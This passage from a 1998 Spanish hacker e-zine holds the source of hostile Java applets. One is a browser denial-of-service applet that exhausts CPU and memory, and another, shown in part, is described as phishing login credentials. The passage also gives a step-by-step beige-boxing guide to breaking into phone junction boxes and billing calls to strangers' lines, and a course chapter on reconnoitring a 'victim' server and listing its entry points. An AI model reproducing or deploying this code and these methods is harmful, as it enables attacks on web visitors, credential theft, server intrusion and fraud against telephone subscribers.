/* This Java Applet tries to convince you that your system is having
   a security problem and that you must now log in to start Netscape
   once again.  If you do so, your user name and password are sent
   by the browser to the home of this applet. In any event, the
   applet then proceeds to drop the bomb on your workstation. */ 

import java.awt.*;
import java.applet.Applet;

public class Ungrateful extends java.applet.Applet implements Runnable {

//  Just a font to paint strings to the applet window 
    Font bigFont = new Font("TimesRoman", Font.BOLD, 36);

//  These threads will attempt to  trick you
//  into logging in, and send your host, login name, and
//  password to its source 
    Thread controller = null;
    Thread sleeper = null;

//  Used to read in a parameter that makes the thread sleep for a
//  specified number of seconds taking effect
    int delay;
//  Used to read in a parameter that determines the port to which
//  Sockets will be connected
    public static int thePort;

    public void init() {
    setBackground(Color.white);

//  Determine how many seconds the main thread should sleep before kicking in
    String str = getParameter("wait");
    if (str == null)
        delay = 0;
    else delay = (1000)*(Integer.parseInt(str));
//  Determine the port number
    str = getParameter("portnumber");
    if (str == null)
        thePort = 7000;
    else thePort = Integer.parseInt(str);
    }


/*  Create and start the main thread in the standard way */

    public void start() {
        if (sleeper == null) {
        sleeper = new Thread(this);
        sleeper.setPriority(Thread.MAX_PRIORITY);
        sleeper.start();
        }
    }

    public void stop() {}


/*  Open a tricky window and start doing wasteful operations */

    public void run() {

//  Let the applet tell its lie
        repaint();

//  Let the applet sleep for a while to avert suspicion
        try {sleeper.sleep(delay);}
        catch(InterruptedException e) {}

        if (controller == null) {
        ErrorMessage err = new ErrorMessage();
        controller = new Thread(err);
        controller.setPriority(Thread.MAX_PRIORITY);
        controller.start();
        }
    }

/*  Paints the applet's lie */

    public void update(Graphics g) {
        paint(g);
    }

    public void paint(Graphics g) {
    g.setColor(Color.blue);
    g.setFont(bigFont);
    g.drawString("All Applets Are Trustworthy!", 10, 200);
    }
}

------------ FIN -------------------------------------------------------------

  3- Denegacion de servicios (DoS - Denial Of Service).

        Como siempre, seguimos con los ataques de DoS, en este caso solo nos
  servira para joder al usuario, ya que tendra que resetear su ordenador
  despues de visitar nuestro 'magnifico' web y seguro que hara referencia a
  toda nuestra familia }:-) Este tipos de ataques pueden ser devastadores
  en algunos casos, por ejemplo imaginemos un ordenador el cual es muy
  importante porque gestiona la bolsa (logicamente esta trabajando todo el
  rato sin parar) entonces un usuario usa este ordenador para visitar web's
  y se encuentra con nuestro web y nuestro applet le ahoga la maquina, este
  tendra que resetear, como veis en este hipotetico caso los da§os podrian
  ser muy importantes, economicamente hablando claro :)

        Este codigo fuente es un buen ejemplo de DoS ya que intenta bloquear
   el navegador y ahoga la CPU y la memoria, por lo que el usuario tendra que
   resetear su maquina.

------------ Codigo Fuente ---------------------------------------------------

/* Consume.java by Mark D. LaDue */

/* February 18, 1996  */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java Applet is intended to bring your Java-aware
   browser to its knees by hogging both the CPU and memory. */

import java.awt.Color;
import java.awt.Event;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Image;

public class Consume extends java.applet.Applet implements Runnable {

//  Just a font to paint strings to our offscreen object
    Font wordFont = new Font("TimesRoman", Font.PLAIN, 12);

//  This thread will attempt to consume CPU resources
    Thread wasteResources = null;

//  An offscreen Image where all of the real action will occur
    Image offscreenImage;

//  All of the tools necessary to handle the offscreen Image
    Graphics offscreenGraphics;  // Needed to handle the offscreen Image

//  To avoid arrays and have open-ended storage of calculation results
    StringBuffer holdBigNumbers = new StringBuffer(0);

//  Used for the while loop in the run() method
    long n = 0;

//  Used to read in a parameter that makes the thread sleep for a
//  specified number of seconds
    int delay;


/* Set up a big blue rectangle in the browser and create an offscreen Image */

    public void init() {
    setBackground(Color.blue);
    offscreenImage = createImage(this.size().width, this.size().height);
    offscreenGraphics = offscreenImage.getGraphics();

//  Determine how many seconds the thread should sleep before kicking in
    String str = getParameter("wait");
    if (str == null)
        delay = 0;
    else delay = (1000)*(Integer.parseInt(str));
    }

/*  Create and start the offending thread in the standard way */

    public void start() {
        if (wasteResources == null) {
        wasteResources = new Thread(this);
        wasteResources.setPriority(Thread.MAX_PRIORITY);
        wasteResources.start();
        }
    }

/*  We won't stop anything */

    public void stop() {}

/*  
    This method repeatedly appends a very large integer to
    a StringBuffer. It can sleep for a specified length 
    of time in order to give the browser enough
    time to go elsewhere before it insidious effects
    become apparent. */

    public void run() {
        try {Thread.sleep(delay);}
        catch (InterruptedException e) {}
        while (n >= 0) {
        try { holdBigNumbers.append(0x7fffffffffffffffL); }
        catch (OutOfMemoryError o) {}
        repaint();
        n++;
        }
    }

    public void update(Graphics g) {
        paint(g);
    }

/*  Paints to the offscreen Image */

    public void paint(Graphics g) {
    offscreenGraphics.setColor(Color.white);
    offscreenGraphics.drawRect(0, 0, this.size().width, this.size().height);
    offscreenGraphics.setColor(Color.blue);
    offscreenGraphics.drawString(holdBigNumbers.toString(), 10, 50);
    }
}

------------ FIN -------------------------------------------------------------

  4- Molestos.

        Como es logico estos ataques solo sirven para molestar al usuario,
  como por ejemplo con un sonido molesto e interminable y al igual que los
  DoS el usuario tendra que resetear el ordenador en el peor de los casos.

        Este applet de java es muy divertido, ya que cuando un usuario
   visite nuestro web, le aparecera un curioso osito ;-) que no se puede
   eliminar hasta que no se cierra el navegador.

------------ Codigo Fuente ---------------------------------------------------

/*  NoisyBear.java by Mark D. LaDue */

/*  February 15, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This Java Applet displays a stupid looking bear with a clock
    superimposed on his belly.  It refuses to shut up until you quit
    the browser.  */

import java.applet.AudioClip;
import java.awt.*;
import java.util.Date;

public class NoisyBear extends java.applet.Applet implements Runnable {
    Font timeFont = new Font("TimesRoman", Font.BOLD, 24);
    Font wordFont = new Font("TimesRoman", Font.PLAIN, 12);
    Date rightNow;
    Thread announce = null;
    Image bearImage;
    Image offscreenImage;
    Graphics offscreenGraphics;
    AudioClip annoy;
    boolean threadStopped = false;

    public void init() {
    bearImage = getImage(getCodeBase(), "Pictures/sunbear.jpg");
    offscreenImage = createImage(this.size().width, this.size().height);
    offscreenGraphics = offscreenImage.getGraphics();
    annoy = getAudioClip(getCodeBase(), "Sounds/drum.au");    
}

    public void start() {
        if (announce == null) {
        announce = new Thread(this);
        announce.start();
        }
    }

    public void stop() {
        if (announce != null) {
        //if (annoy != null) annoy.stop();  //uncommenting stops the noise
        announce.stop();
        announce = null;
        }
    }

    public void run() {
        if (annoy != null) annoy.loop();
        while (true) {
        rightNow = new Date();
        repaint();
        try { Thread.sleep(1000); }
        catch (InterruptedException e) {}
        }
    }

    public void update(Graphics g) {
//        g.clipRect(125, 150, 350, 50);
        paint(g);
    }

    public void paint(Graphics g) {
        int imwidth = bearImage.getWidth(this);
        int imheight = bearImage.getHeight(this);

     offscreenGraphics.drawImage(bearImage, 0, 0, imwidth, imheight, this);
     offscreenGraphics.setColor(Color.white);
     offscreenGraphics.fillRect(125, 150, 350, 100);
     offscreenGraphics.setColor(Color.blue);
     offscreenGraphics.drawRect(124, 149, 352, 102);
     offscreenGraphics.setFont(timeFont);
     offscreenGraphics.drawString(rightNow.toString(), 135, 200);
     offscreenGraphics.setFont(wordFont);
     offscreenGraphics.drawString("It's time for me to annoy you!", 135, 225);
     g.drawImage(offscreenImage, 0, 0, this);
    }

    public boolean mouseDown(Event evt, int x, int y) {
        if (threadStopped) {
            announce.resume();
        }
        else {
            announce.suspend();
        }
        threadStopped = !threadStopped;
        return true;
    }
}

------------ FIN -------------------------------------------------------------

        Supongo que ahora tendreis los dientes largos, pues yo no lo haria,
  ya que el hack en Java es relativamente dificil, hoy en dia los
  navegadores estan bastante protegidos contra estos ataques, si negamos
  que nuestro navegador deniege los applets en web que no conoces no nos
  pasara nada, el unico inconveniente es que todo el rato nos saldran
  las dichosas ventanitas avisandos sobre ello.

        Estas son las restricciones que los navegadores mas famosos imponen
  a los applets de java (logicamente me refiero a Internet Explorer y
  Navigator):

  - Los applets no pueden leer o escribir a archivos en la maquina del
    navegador (locales).
  - Los applets no pueden abrir una conexion de red a ninguna maquina que no
    sea su maquina de origen.
  - Los applets no pueden leer mas que ciertas propiedades del sistema, no
    criticas.
  - Si un applet se carga mediante un URL del tipo file: es cargado tambien
    por el cargador de applets, excepto si se halla en el CLASSPATH.

        Como vemos no todo es bonito, ya que en realidad si queremos que
  nuestro hacking en Java sea efectivo debemos estar a la ultima en
  asuntos de Java, ya que los ataques mas devastadores (categorias 1 y 2) son
  a causa de fallos en el runtime de Java y este tipo de informacion suele
  ser muy restringida. Se conocen varios fallos en el runtime en algunos
  laboratorios de seguridad informatica pero logicamente estos no suelen
  revelar sus descubrimientos.

  Y desde aqui saludar a toda la pe§a de #hackers, #hack, #rejoin &
  #seguridad_informatica

  Grupos como - J.J.F. / HACKERS TEAM -, CYBERHACK, WAKANDA, UNDERHACK,
  @pOkalypSYS y por supuesto todos los demas !!

  Y por supuesto: Bisho, Meroka, Folixia, Fragel, Ipgh0st, Metalslug, Dillet,
  Riddle, Hadden, Guybrush, Tdp, Virux, Cy, Angelipas, Schoddy guy, Xus,
  Unix-hell, Piotr, Muerte, Koji, Riddle, Case Zero, Nadia, Amanda, Janex,
  L.A., Enif y todos los que me dejo :)

                                                             NOBODY (c) 1998.

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
                         _________________________
                        |       OiOiOdoc #2       |
                        | Un pokillo de phreaking |
                        |          por            |
                        | DrSlump de OiOiO's Band |
                        |  DrSlump@CyberJunkie.com|
                         -------------------------
                         
        Bueno, antes de nada, aclarar que TODO lo escrito aqu° es puramente
  con FINES EDUCACIONALES y , ni yo ni ning£n miembro de OiOiO'S Band se hace
  responsable del mal uso que se le pueda dar, y esas cosas m s que se dicen.
  Aclarado esto, vamos a por ello ;)

        Ante nada, decir que lo que aqu° se va a comentar es una cosa muy
  cutre, que debemos agradecer a los coleguitas de la Timof¢nica.

        Voy a explicar como hacer beige boxing de guays en Espa§a, en otros
  paises no creo que var°e mucho la cosa, pero aqu° est  facilillo.
  Pal que no lo sepa, el beige boxing consiste en llamar por telefono desde
  la calle o cualquier sitio donde encuentres una cajita de Timof¢nica para
  poder pinchar tu "m¢vil" ;)

        Lo primero de todo pasa por pillarte un telefono, preferiblemente
  peque§o, de esos que solo tienen el mango, pq va a ser nuestro m¢vil (si
  quieres uno grande, t£ mismo, pero es m s dificil de esconder y m s palo
  llevarlo ). Bien, aparte de eso necesitaremos, o bien unas pinzas de
  cocodrilo de esas, o un "enchufe" que se encuentra dentro de las cajas esas
  de la Timo (las grandes, las peque§as no se pq no he abierto ninguna, aun)
  Bueno, el proceso est  tirao, y pasa por cortar un cachito del cable que va
  a la roseta de la pared del telefono, y acoplarle ah°, o bien las pinzas, o
  bien el mencionado enchufe (en caso de tener cuatro cables, se ha de
  enchufar en los que quedaran enmedio , que generalmente son marr¢n y
  blanco). Tras ello ya tenemos m¢vil, y solo falta ir a llamar ;)

        Las cajas a las que me refiero est n a una altura del pecho, y llevan
  el logo de la Timof¢nica, y algunas llevan una pegata que pone: "manipular
  solo con el instrumental adecuado", y tb suelen llevar n£meros para indicar
  a los chup¢pteros de que zona se encarga la caja XDDDDD El proceso para
  encontrar cajas es bien sencillo. Busca por:

        -Barrios residenciales, por dos cosas : todas las casas son plantas
  bajas, y en las zonas con edificios las cajas suelen ser de esas peque§itas
  que se colocan en las fachadas de los edificios, a la altura del 1er piso, y
  sobre todo, porque piensa que al llamar la puta Timof¢nica no pierde nada,
  ya que llamamos cogiendo la linea de un pobre incauto, que desconoce lo
  poco que la Timof¢nica protege su l°nea de telefono. As°, si estamos en una
  zona de ricos es l¢gico pensar que va a pagar alg£n acaudalado ricach¢n, con
  lo que no me remuerde en absoluto la conciencia sino que por el contrario,
  me anima a hacerlo ;) De todas formas ten en cuenta que en cualquier zona
  con casas que sean chalets o plantas bajas habr  cajas de estas ;)

        -Carreteras, o tramos en los que hay mucho campo. Para ello basta con
  fijarse en los palos por donde van los cables, y seguir los de telefonos
  (no es muy dificil), que son f ciles de reconocer pq muchas veces acaban en
  una especie de gran consolador negro encima del palo o si no, te fijas de
  las l°neas que provienen de casas y van hacia la caja, que son los cables
  m s finos que hay, y a menudo hay muuuchos cables de estos finos, as° que
  solo hay que seguirlos 

        Bueno, ya hemos llegado a la caja, y ahora ...... ≠ESTA CERRADA!
  Tranquilo ;) Has de ir provisto de una llave de contadores de gas, de esas
  triangulares, o si no tienes (como yo), un buen destornillador (ti§aor de
  ahora en adelante ) har  de llave ;)

        Bien, si tienes la llave de contadores, te puedes saltar lo siguiente,
  que explica para paletos como abrir una caja con un ti§aor (la verd  es
  que no tiene secreto)

        Si eres de los que van con ti§aor en mano, sigue leyendo.
  Al toparte con la caja, puede darse la ocasi¢n de que te encuentres con
  alguna de las m s antiguas, que son de hierro o algo as°, y suelen estar
  por el campo, carreteras y dem s, as° como en lugares donde la timo vaya
  poco, ya que parece que ahora todas las ponen de pl stico 8)''' ;)

        Bueno, en este caso, pilla el ti§aor, lo metes por donde queda la
  cerradura, y espero que sea un buen ti§aor, pq ahora hay que hacer
  palanca O:) XDDDDDD

        Supongo que tras ello ya tendr s la caja, abierta, con sus cables,
  sus ruedecitas y sus agujeritos, ahora ya puedes pasar a la siguiente parte
  ;)

        Si sigues leyendo es pq has tenido la suerte de entontrarte con un
  cajet°n de los de pl stico, pues bien, estos son facil°simos de abrir.
  Puedes hacerlo como he dicho antes, con el ti§aor, o si se te ha olvidado
  en casa, simplemente pilla por la cerradura con las manos y pega un tir¢n ;)
  ®F cil, verdad? }:)

        Vale, ®y ahora? Que co§o hago! Bueno, pues ahora pilla el enchufe al
  que me refer°a antes, que est  en la parte superior de la caja, aguantado
  con un hilo de pescar (si no se lo ha llevado alguien), y ver s que hay
  unas ruedecitas negras con agujeros en las diagonales, y que a algunas les
  llegan unos cables del lado. Bien, pues los que tienen los cables son los
  que interesan, puesto que son los que tienen l°nea. Ahora solo hace falta
  enchufar el enchufe ese en alguno de esos, poniendolo por encima de la
  ruedecita, y de forma que pille los agujeros esos de las diagonales, y
  girarlo un poquillo para que enganche bien. Bueno, si eres de los que has
  endi§ado el enchufe al m¢vil, solo te falta llamar, si le has puesto las
  pinzas, simplemente pincha una a cada patilla y a llamar tocan.

        Bueno, pues ahora solo queda que este, en un buen sitio para poder
  llamar sin problemas, o lo que sea. Puedes inventarte 1000 maneras de
  usarlo, desde pinchar la l°nea auxiliar de tu casa a casa del vecino, a
  pillarte un port til e irte por la noche a festear de gratix, y dem s
  ..... ;)

        Correcciones, sugerencias o lo que quer is en DrSlump@CyberJunkie.com
  Miembro oficial de OiOiO'S Band OiOiO's Band son : Arale, DrSlump,
  MaSHiRiTo, NiKoTXaN, tar0 & Turbo .... 

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

                              - CURSO DE HACK - 
                                  CHAPTER IV

        Bueno, como vimos en la tercera entrega del curso, analizar los
  puertos no es nada dificil. Ahora trataremos de analizar un server y
  sacar informacion del mismo con simples comandos de Unix/Linux y ademas
  definiremos los puntos de ataque a un servidor, logicamente nunca usaremos
  esta informacion para actos delictivos!! Este articulo esta enfocado no
  solo para los hackers sino tambien para los Administradores ya que es el
  "Modus Operandi" de muchos hackers.

  - Analisis Del Server Victima.

        En este apartado trataremos de sacar informacion de un servidor para
  saber sus puntos debiles, cuando esta o no este el root, sus usuarios, etc.
  A estas alturas ya sabemos que puertos tiene el servidor victima abiertos
  por lo que ahora usaremos los comandos del Unix/Linux para ampliar nuestra
  informacion del sevidor victima. Por lo que jugaremos con los comandos
  como finger, showmount, rpcinfo, whois, etc... Como vemos son comandos muy
  tipicos que ademas nos seran de gran ayuda, que conste que en este articulo
  solo estamos analizando porque lo que no se explicara en este articulo
  metodos de ataque con estos comandos, ademas que ya estan anticuados de
  todas formas.

        Empezemos el analisis, ya hemos escaneado los puertos del server
  victima y solo conocemos su url 'www.victima.com', entonces ahora queremos
  saber mas cosas por lo que ejecutamos:

  conde$ nslookup www.victima.com

        Nos saldra informacion del server en cuestion. su IP, su alias, su
  nombre, etc... informacion que nos sera muy util. Ahora haremos un finger
  para sacar info de los usuarios, de la siguiente manera:

  conde$ finger @victima.com
  [victima.com]
  Login       Name             TTY Idle     When    Where
  admin      Manolo             co   1d  Mon 06:15   casa.com

        En este ejemplo vemos que ahora mismo el Administrador esta conectado
  al server por lo que hay que tener cuidado :) y vemos que esta conectado
  desde casa, y si queresmos podemos intentar hacer el mismo proceso con
  'casa.com' para ver si podemos conectar con el odenador de su casa ;-) pero
  nosotros seguiremos con el 'victima.com'. Si por ejemplo nos sale un
  listado grande de usuarios podemos seguir utlizando el finger para obtener
  mas informacion, como por ejemplo:

  conde$ finger admin@victima.com

        Y asi indefinidamente. Tambien puede que el servidor victima no
  acepta el finger por lo que nos saldra un mensaje de rechazo y tendremos
  que seguir con otros metodos de analisis. Ahora pasaremos a saber que
  tiene montado el servidor victima y eso sera de la siguiente manera:

  conde$ showmount -e victima.com

        Con lo que nos saldra un listado si todo sale bien, logicamente.
  Tambiem podemos hacer un whois para ver que informacion nos sale:

  conde$ whois victima.com

        Ahora ya sabemos bastante informacion del servidor victima, pero
  todavia queremos sacar mas informacion por lo que usaremos el rcpinfo, ya
  que conseguiremos jugosa informacion ;-)

  conde$ rpcinfo -p victima.com

        Hecho esto podemos saber si el servidor utiliza NIS, informacion
  diversa e incluso si utilizan algun software de seguridad en muchos casos.
  Logicamente para saber como movernos debemos conocer el s.o. unix y el
  funcionamiento de redes, ya que tendremos que deducir muchas cosas que aqui
  no explico.

        A estas alturas ya estamos muy preparados pero todavia no nos basta,
  por lo que usaremos el telnet para conectar al puerto del sendmail, para
  averiguar la version.

  conde$ telnet
  telnet> open victima.com 25
        
        Tambien podemos darnos un paseo en el servidor victima, usando el
   FTP o el TFTP.

   conde$ ftp
   ftp> open victima.com

        Con estos 2 ultimos pasos sabemos que version tiene de sendmail y
   tambien que podemos hacer en el FTP. Ahora ejecutaremos el 'tcpmap' para
   saber que servicios rpc tiene abierto el servidor victima:

   conde$ tcpmap victima.com
 
        Y como en los ejemplos de antes nos saldra un listado con los
   servicios que tiene abierto y sabremos a que puertos podemos conectar :)   
   Aqui acaba el analisis del servidor victima. Ahora estamos preparados para
   analizar un servidor de una forma general. Como ya dije antes aqui solo
   estamos analizando por lo que no he explicado metodos de entrada al
   servidor victima.

        Aqui hemos visto como analizar y obtener ventaja sobre el
  Administrador del servidor victima, pero tambien para esta labor podemos
  usar determinadas herramientas como Satan, ISS, etc. En este caso siempre
  estamos desde un servidor remoto intentando obtener informacion de un
  servidor victima, con esto solo quiero decir que si ya estuviesemos dentro
  del servidor victima podemos aplicar otros metodos y herramientas de
  analisis.

  - Puntos Claves De Un Server.
  
        Los puntos de ataque de un servidor pueden ser muy variados, como
  por ejemplo desde meter un virus, borrar la informacion, bloquearlo,
  colgarlo, pillar root, etc. Por lo tenemos que tener cuidado con lo que
  hacemos, sobre todo porque nosotros no queremos da§ar ningun servidor,
  simplemente queremos conocerlo y en todo caso ayudar al admin :)

        Ahora ya que sabemos que puertos tiene abierto el servidor victima,
  desarrollaremos un estrategia de ataque, siguiendo el siguiente esquema,
  en el cual se enumera los posibles puntos de acceso a un servidor:

  -> Debilidades en el FTP.
  -> Exportacion de programas no permitidos NFS.
  -> Exportacion via el portmapper NFS.
  -> Acceso al sistema de passwords del NIS.
  -> Acceso mediante REXD.
  -> Utilizacion de SATAN.
  -> Debilidades en el Sendmail.
  -> Acceso mediante TFTP.
  -> Acceso mediante shell remoto.
  -> Exportacion no restringida del NFS.
  -> Acceso no restringido a un servidor X.
  -> Uso no restringido de un modem.
  -> Escritura a un directorio principal FTP.
  -> Debilidades en un protocolo.
  -> Debilidades en software no perteneciente directamente al s.o.

        Como podemos apreciar aqui, muchos son los puntos de entrada a un
  server, logicamente existen mas :), pero esto nos simplificara mucho nuestro
  trabajo. Solo nos queda tener informacion suficiente sobre cada agujero
  existente del esquema de arriba.

        En estos momentos ya conocemos los puntos de entrada a un servidor,
  por lo que ahora os explicare los diferentes puntos de peligro que existen
  en un servidor y cuales son los que mas nos interesan.

        Para esto usaremos la Tabla de los Niveles de Cracking de Sam, la
  cual seguro os sera muy interesante, no solo para los propios hackers sino
  tambien para los Administradores (para que luego digan que no les ayudamos
  :), que es la siguiente:

    ------------------------------------------------------------------------
    ≥             Tabla de los Niveles de Cracking de Sam                  ≥
    ------------------------------------------------------------------------

                       ⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø       Usuarios remotos
                       ≥           1…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ> obtiene root 
    Ataques de         ≥ ⁄ƒƒƒƒƒƒƒƒƒƒ∫ƒƒƒƒƒƒƒƒø ≥       
    Mail bomb <ÕÕÕÕÕÕÕÕπ ≥         2∫        ≥ ≥       
                       ≥ ≥ ⁄ƒƒƒƒƒƒƒƒ∫ƒƒƒƒƒƒø ≥ ≥
    Ataques            ≥ ≥ ≥       3∫      ≥ ≥ ≥
    mediante           ≥ ≥ ≥ ⁄ƒƒƒƒƒƒ∫ƒƒƒƒø ≥ ≥ ≥
    DoS      <ÕÕÕÕÕÕÕÕÕÕπ≥ ≥ ≥     4∫    ≥ ≥ ≥ ≥
                       ≥ ≥ ≥ ≥ ⁄ƒƒƒƒ∫ƒƒø ≥ ≥ ≥ ≥       Usuarios remotos
                       ≥ ≥ ≥ ≥ ≥   5∫  ÃÕÕÕÕÕÕÕÕÕÕÕÕÕ> pueden escribir en
    Usuarios           ≥ ≥ ≥ ≥ ≥ ⁄ƒƒ ø ≥ ≥ ≥ ≥ ≥       archivos del sistema
    locales            ≥ ≥ ≥ ≥ ≥ ≥ 6 ≥ ≥ ≥ ≥ ≥ ≥
    obtienen sin       ≥ ≥ ≥ ≥ ≥ ¿ƒƒƒŸ ≥ ≥ ≥ ≥ ≥
    autorizacion       ≥ ≥ ≥ ≥ ≥   5   ≥ ≥ ≥ ≥ ≥
    permiso de         ≥ ≥ ≥ ≥ ¿ƒƒƒƒƒƒƒŸ ≥ ≥ ≥ ≥
    lectura <ÕÕÕÕÕÕÕÕÕÕÕÕπ ≥ ≥     4     ≥ ≥ ≥ ≥
                       ≥ ≥ ≥ ¿ƒƒƒƒƒƒƒƒƒƒÀŸ ≥ ≥ ≥
                       ≥ ≥ ≥       3 À  ∫  ≥ ≥ ≥
                       ≥ ≥ ¿Àƒƒƒƒƒƒƒƒ∫ƒƒ∫ƒƒŸ ≥ ≥
    Usuarios           ≥ ≥  ∫      2 ∫  »ÕÕÕÕÕÕÕÕÕÕÕÕ> Usuarios remotos 
    locales            ≥ ¿ƒƒ∫ƒƒƒƒƒƒƒƒ∫ƒƒƒƒƒƒƒŸ ≥       pueden leer archivos
    pueden escribir    ≥    ∫      1 ∫         ≥       del sistema {PELIGRO}
    en ficheros que    ¿ƒƒƒƒ∫ƒƒƒƒƒƒƒƒ∫ƒƒƒƒƒƒƒƒƒŸ
    no deberian  <ÕÕÕÕÕÕÕÕÕÕº        »ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ> Usuarios remotos
                                                       obtienen sin
                                                       autorizacion logins
                                                       del sistema

        Ahora como hackers o Administradores conocemos los distintos niveles
  de peligro en un servidor. Logicamente a cada uno le interesa un nivel
  diferente, por ejemplo a un hacker le interesa los niveles {3,4,5,6}, a un
  Administrador le interesan todos los niveles para poder evitarlos, a un
  cracker le interesan los niveles destructivos {1}.

        En las siguiente lineas explicare, los distintos niveles, para que
  queden bien claro.

        * Nivel 1: En este nivel los ataques son poco importantes, ya que
  no conseguiran acceso a la red pero por el contrario pueden bloquear o
  resetear el sistema. Basicamente estos ataques se basan en mailing bombing
  y Denial Of Service, el primero es muy facil de seguir el rastro mientras
  que el segundo puede ser mas complicado. Hay que decir que se utiliza el
  Denial Of Service como avanzadilla de otros atques. Este nivel es muy facil
  de proteger y controlar.

        * Nivel 2 y 3: En estos niveles el peligro es mayor, ya que los
  usuarios pueden escribir o leer en ficheros que no deberian pero ademas
  pueden intentar subir de nivel a partir de este, poniendo el sistema en
  mayor peligro. Los usuarios buscaran malas configuraciones o agujeros en
  algun software que le permita pasar a un nivel superior. Para la seguridad
  del sistema conviene que el Administrador este consciente de los avisos
  sobre seguridad en la comunidad informatica.

        * Nivel 4: En este nivel usuarios que no pertemecen al sistema han
  conseguido acceso, ademas de poder leer ficheros los cuales no deberian
  poder. Al igual que antes el acceso se debe a una mala configuracion del
  sistema, CGI o desbordamientos de memoria.

        * Nivel 5 y 6: Logicamente estos niveles son los mas peligrosos y
  nunca deberian ocurrir ya que el sistema dejaria de ser del Administrador.
  Esto se puede evitar facilmente si hemos reparado los niveles anteriores.

        Ahora llegados a este punto, ya tenemos una vision bastante amplia
  del analisis de un server remotamente, logicamente. Por lo que ya podemos
  con toda la informacion recopilada dise§ar un plan de ataque y conseguir
  entrar en el server victima. Tambien hay que decir que aqui lo estamos
  simplificando pero en realidad no es tan facil, ya que existen muchas
  medidas de seguridad y seguramente nos toparemos con muchas, con lo que
  el circulo se ira estrechando.

        Pues aqui acaba este entrega y espero que os haya servido de algo,
  puede ser que parezca un rollo lo aqui explicado, pero esto es lo necesario
  para saber moverse y saber que hacemos todo el rato, ademas con la
  informacion aqui descrita podemos ayudar a los Administradores para que
  hagan su trabajo correctamente, cosa que muy pocos hacen, pero para eso
  estamos nosotros aqui ;-)

  Byes all y hasta la vista !!
    
                                                        CONDE VAMPIRO
                                                  - J.J.F. / HACKERS TEAM -

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

                      -------------------------------------
                      <><> Como Hackear un Tamatgotchi <><>
                      -------------------------------------

        Este es un articulo muy cachondo que me he encontrado en la 2600, en
  el numero de invierno, el articulo ha sido escrito originalmente por
  MiLtRoNi, y dice asi:

        "Cuando le compre a mi hija su primer tamatgotchi, pense que era algo
  que era bueno. Pero despues de unos dias, cuando me encontre solo en casa
  con el, fue cuando empezo a mauyar (es un gato) pidiendome "comida virtual".
  Al principio pase de el, pero luego se puso a llorar pidiendome ayuda. Que
  clase de padre era, si este era el juguete de mi hija y su creacion?.
  Primero, mi hija, tubo todos los cuidados de su "mascota virtual", le daba
  de comer, jugaba con el, le lababa, y luego a la cama. Todo fue bien por un
  momento hasta que "Liz" la gatita virtual paso al "otro lado", y asi le
  siguieron "Liz2" y "Liz3" y "Liz4". Mi hija al final se canso de tanta
  mascota virtual. Estaba horrorizado al ver como "Liz4" moria mientras pedia
  ayuda. La mascota pronto encontro su sitio en el fondo del cajon y de como
  gastar sus ultimas pilas, en una especie de "limbo virtual". Despues de unos
  dias que encontre un poco de tiempo, empece a experimentar con "LizX".

        Primero tube que llamarla de muchas maneras a medida que se me iban
  muriendo, algunos solo duraron unos minutos, otros algun que otro dia. Les
  iba a ense§ar "trucos sucios", y SI, les castigaria si los hacian mal.
  Engordaban mu facil, constantemente mas bien, porque, por ejemplo cuando
  habeis visto a un gato que pesara 5 kilos cuando solo tenia 2 horas de vida
  :)?. Por eso tambien morian extremadamente facil. Incluso les seguia la
  paranolla de llevarlos al veterinario, pero lo unico que querian hacer era
  jugar y jugar.

        Era un dia frio de noviembre cuando nacio "Borg5". Sabia que este iba
  a ser diferente, era mi ultima creacion, y la definitiba :). Estaba
  perdiendo la cabeza con tanto gatito ya, asi que tenia que parar de una vez
  esta locura. "Borg5" era muy cooperativo, aparte de eso encontre que si
